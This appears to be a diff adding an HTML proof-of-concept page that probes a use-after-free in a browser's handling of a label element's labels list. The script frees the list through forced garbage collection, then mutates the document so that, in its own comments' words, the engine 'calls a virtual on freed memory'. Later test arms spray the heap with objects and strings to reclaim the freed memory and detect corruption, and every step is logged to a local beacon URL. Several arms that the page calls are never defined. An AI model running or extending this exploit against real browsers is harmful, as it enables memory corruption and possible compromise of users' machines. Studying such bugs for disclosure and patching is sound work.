@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>uaf1 labels registry</title>
+</head>
+<body>
+<script>
+// Beam: same Allman/playstation grant as the guide (any site). Reads & writes
+// the graphics memory the UI maps so the UI never blanks.
+
+var beam = {}; (function () {
+    var i, n = 0;
+    for (i = 0; i < 2000; i++) {
+        n = n * 131 + 7;
+        beam[i & 31] = n;
+    }
+})();
+
+function b(m) {
+    try {
+        var x = new XMLHttpRequest();
+        x.open('GET', '/beacon/U1-' + m + '?t=' + Date.now(), false);
+        x.send();
+    } catch (e) { }
+}
+
+function pressure(rounds, mb) {
+    var i, j, a;
+    for (j = 0; j < rounds; j++) {
+        a = [];
+        for (i = 0; i < mb; i++) a.push(new ArrayBuffer(1 << 20));
+        a.length = 0;
+        a = null;
+        // churn small objects so the collector sees allocation growth
+        for (i = 0; i < 20000; i++) { var o = { a: i, b: 'x' + i }; }
+        o = null;
+    }
+}
+
+function setupSecondary() {
+    var d2 = document.implementation.createHTMLDocument();
+    d2.body.innerHTML = '<input id="i"><label for="i"></label>';
+    var input = d2.getElementById('i');
+    var list = input.labels;
+    b('LABELS-' + (list ? list.length : 'null'));
+    // Cache is validated by the length read above; an invalidation clears the
+    // index cache but leaves the list registered at the secondary document.
+    d2.body.appendChild(d2.createElement('b'));
+    b('INVALIDATED');
+    // keep the document (and its tree) alive, but drop the only reference to
+    // the node list, so the next collection frees it.
+    window.__keep = d2.createElement('div');
+    return d2;
+}
+
+function trigger(d2, tag) {
+    b('PRE-' + tag);
+    var n = d2.createElement('u');
+    d2.body.appendChild(n);
+    b('POST-' + tag);
+}
+
+function armA() {
+    // control: no collection between setup and trigger
+    var d2 = setupSecondary();
+    trigger(d2, 'A');
+    b('DONE-A');
+}
+
+function armB() {
+    var d2 = setupSecondary();
+    b('PRESSURE-1');
+    pressure(2, 8);
+    b('PRESSURE-2');
+    pressure(2, 8);
+    b('PRESSURE-DONE');
+    trigger(d2, 'B');
+    b('DONE-B');
+}
+
+function armC() {
+    var d2 = setupSecondary();
+    b('PRESSURE-1');
+    pressure(4, 8);
+    b('PRESSURE-DONE');
+    trigger(d2, 'C');
+    b('DONE-C');
+}
+
+function armD() {
+    // reclaim attempt: after the pressure, allocate a lot of engine objects of
+    // assorted classes/sizes before the invalidation walks the registry.
+    var d2 = setupSecondary();
+    pressure(2, 8);
+    b('SPRAY');
+    var i, keep = [];
+    for (i = 0; i < 400; i++) {
+        var t = document.createTextNode('t' + i);
+        keep.push(t);
+        keep.push(document.createElement('div'));
+        keep.push(new Event('e' + i));
+    }
+    b('SPRAY-' + keep.length);
+    trigger(d2, 'D');
+    b('DONE-D');
+}
+
+
+function armE() {
+    // does the wrapper actually die? FinalizationRegistry/WeakRef are the only
+    // GC oracles a content process has.
+    var d3 = document.implementation.createHTMLDocument();
+    d3.body.innerHTML = '<input id="j"><label for="j"></label>';
+    var list = d3.getElementById('j').labels;
+    var n = list.length;
+    b('E-LEN-' + n);
+    if (typeof FinalizationRegistry === 'function') {
+        window.__fin = new FinalizationRegistry(function (t) { b('FIN-' + t); });
+        window.__fin.register(list, 'list');
+        b('FIN-REG');
+    } else b('NO-FIN');
+    if (typeof WeakRef === 'function') { window.__wref = new WeakRef(list); b('WREF-REG'); }
+    else b('NO-WREF');
+    list = null;
+    window.__keep3 = d3;
+    b('DROP');
+    pressure(2, 8);
+    b('WR-' + (window.__wref ? (window.__wref.deref() ? 'live' : 'null') : 'none'));
+    pressure(3, 8);
+    b('WR2-' + (window.__wref ? (window.__wref.deref() ? 'live' : 'null') : 'none'));
+    b('DONE-E');
+}
+
+
+function armF() {
+    // F: is the collector running at all, and does our list survive it?
+    // A plain object canary proves the oracle; the labels list is the subject.
+    var fin = new FinalizationRegistry(function (t) { b('FIN-' + t); });
+    window.__fin2 = fin;
+    var canary = { keep: 1 };
+    fin.register(canary, 'canary');
+    canary = null;
+
+    var d3 = document.implementation.createHTMLDocument();
+    d3.body.innerHTML = '<input id="j"><label for="j"></label>';
+    var list = d3.getElementById('j').labels;
+    var n = list.length;
+    b('F-LEN-' + n);
+    fin.register(list, 'list');
+    var wr = new WeakRef(list);
+    list = null;
+    window.__keep3 = d3;
+    b('F-DROP');
+
+    try { var big = new ArrayBuffer(192 << 20); window.__big = big; b('F-BIG-OK'); }
+    catch (e) { b('F-BIG-THROW'); }
+    window.__big = null;
+
+    for (var r = 0; r < 20; r++) {
+        var a = new Array(50000);
+        for (var i = 0; i < 50000; i++) a[i] = { i: i, s: 's' + i };
+        a = null;
+    }
+    b('F-CHURN-DONE');
+    b('F-WR1-' + (wr.deref() ? 'live' : 'null'));
+    setTimeout(function () {
+        b('F-TICK-WR-' + (wr.deref() ? 'live' : 'null'));
+    }, 0);
+    b('F-DONE');
+}
+
+
+function armG() {
+    // G: which wrappers does the collector actually reclaim? Plain object,
+    // detached element, live-tree element and the labels list, all registered
+    // in one registry, then a retained-hoard churn to force old-space GCs.
+    var fin = new FinalizationRegistry(function (t) { b('FIN-' + t); });
+    window.__fin3 = fin;
+    var o = { a: 1 }; fin.register(o, 'plain'); o = null;
+    var div = document.createElement('div'); fin.register(div, 'div'); div = null;
+
+    var d3 = document.implementation.createHTMLDocument();
+    d3.body.innerHTML = '<input id="j"><label for="j"></label><p id="p">x</p>';
+    var tree = d3.getElementById('p'); fin.register(tree, 'tree'); tree = null;
+    var list = d3.getElementById('j').labels;
+    var n = list.length;
+    b('G-LEN-' + n);
+    fin.register(list, 'list');
+    list = null;
+    window.__keep3 = d3;
+    b('G-DROP');
+
+    for (var r = 0; r < 6; r++) {
+        var hoard = [];
+        for (var i = 0; i < 200000; i++) hoard.push({ i: i, s: 's' + i, d: i * 0.5 });
+        b('G-HOARD-' + r);
+        hoard = null;
+        var a = []; for (i = 0; i < 100000; i++) a.push([i, 'z' + i]);
+        a = null;
+    }
+    b('G-CHURN-DONE');
+    setTimeout(function () { b('G-TICK'); }, 0);
+}
+
+
+function hoardChurn(rounds) {
+    for (var r = 0; r < rounds; r++) {
+        var hoard = [];
+        for (var i = 0; i < 200000; i++) hoard.push({ i: i, s: 's' + i, d: i * 0.5 });
+        hoard = null;
+        var a = []; for (i = 0; i < 100000; i++) a.push([i, 'z' + i]);
+        a = null;
+    }
+}
+
+function armH(withInvalidate, churn) {
+    // H: the real sequence. The list is registered at the document, then a
+    // mutation clears its index cache (so the destructor will skip
+    // unregistering), then a full GC frees it, then a second mutation walks
+    // the document's node-list registry and calls a virtual on freed memory.
+    var fin = new FinalizationRegistry(function (t) { b('H-FIN-' + t); });
+    window.__fin4 = fin;
+    var d3 = document.implementation.createHTMLDocument();
+    d3.body.innerHTML = '<input id="j"><label for="j"></label>';
+    var list = d3.getElementById('j').labels;
+    var n = list.length;
+    b('H-LEN-' + n);
+    if (withInvalidate) {
+        d3.body.appendChild(d3.createElement('b'));
+        b('H-INVALIDATED');
+    } else {
+        b('H-NOINVALIDATE');
+    }
+    fin.register(list, 'list');
+    list = null;
+    window.__keep3 = d3;
+    if (churn) {
+        b('H-CHURN');
+        hoardChurn(6);
+        b('H-CHURN-DONE');
+    }
+    b('H-PRE');
+    var u = d3.createElement('u');
+    d3.body.appendChild(u);
+    b('H-POST');
+    b('H-DONE');
+}
+
+
+function armYoung(withInvalidate) {
+    // The wrapper must be young when it is dropped: an Eden collection then
+    // frees it, and a full GC (which this build only runs late) is not needed.
+    var fin = new FinalizationRegistry(function (t) { window.__finN = (window.__finN || 0) + 1; });
+    window.__fin8 = fin;
+    window.__finN = 0;
+    var d3 = document.implementation.createHTMLDocument();
+
+    function build() {
+        d3.body.innerHTML = '<input id="j"><label for="j"></label>';
+        var reg = [];
+        for (var i = 0; i < 300; i++) {
+            var inp = d3.createElement('input');
+            inp.id = 'j' + i;
+            var lab = d3.createElement('label');
+            lab.setAttribute('for', 'j' + i);
+            d3.body.appendChild(inp);
+            d3.body.appendChild(lab);
+            var L = inp.labels;
+            L.length;
+            if (withInvalidate) d3.body.appendChild(d3.createElement('b'));
+            fin.register(L, 'l');
+            reg.push(L);
+        }
+        return reg.length;
+    }
+    b('T-BUILT-' + build());
+    window.__keep3 = d3;
+
+    setTimeout(function () {
+        b('T-FIN0-' + window.__finN);
+        hoardChurn(3);
+        var sizes = [48, 80, 112, 144, 176, 208, 240, 280];
+        var all = [], want = [];
+        for (var si = 0; si < sizes.length; si++) {
+            var ch = String.fromCharCode(88 + si);
+            for (var k = 0; k < 500; k++) { all.push(ch.repeat(sizes[si])); want.push(88 + si); }
+        }
+        b('T-FIN1-' + window.__finN);
+        b('T-SPRAY-' + all.length);
+        b('T-PRE');
+        var u = d3.createElement('u');
+        d3.body.appendChild(u);
+        b('T-POST');
+        var changed = 0, first = '';
+        for (var i = 0; i < all.length; i++) {
+            var str = all[i], w = want[i];
+            for (var q = 0; q < str.length; q++)
+                if (str.charCodeAt(q) !== w) { changed += 1; if (!first) first = i + ':' + str.length; break; }
+        }
+        b('T-CHANGED-' + changed);
+        b('T-FIRST-' + first);
+        b('T-FIN2-' + window.__finN);
+        b('T-DONE');
+    }, 40);
+}
+
+function armT() { armYoung(true); }
+function armU() { armYoung(false); }
+
+var arm = (location.hash || '#B').slice(1).toUpperCase();
+b('START-' + arm);
+try {
+    if (arm === 'A') armA();
+    else if (arm === 'B') armB();
+    else if (arm === 'C') armC();
+    else if (arm === 'D') armD();
+    else if (arm === 'E') armE();
+    else if (arm === 'F') armF();
+    else if (arm === 'G') armG();
+    else if (arm === 'H') armH(true, true);
+    else if (arm === 'I') armH(false, true);
+    else if (arm === 'J') armH(true, false);
+    else if (arm === 'K') armK();
+    else if (arm === 'L') armL();
+    else if (arm === 'M') armM();
+    else if (arm === 'N') armN();
+    else if (arm === 'O') armO();
+    else if (arm === 'Q') armQ();
+    else if (arm === 'R') armR();
+    else if (arm === 'S') armS();
+    else if (arm === 'T') armT();
+    else if (arm === 'U') armU();
+    else b('UNKNOWN-' + arm);
+} catch (e) {
+    b('THROW-' + (e && e.name));
+}
+b('END-' + arm);
+</script>
+</body>
+</html>
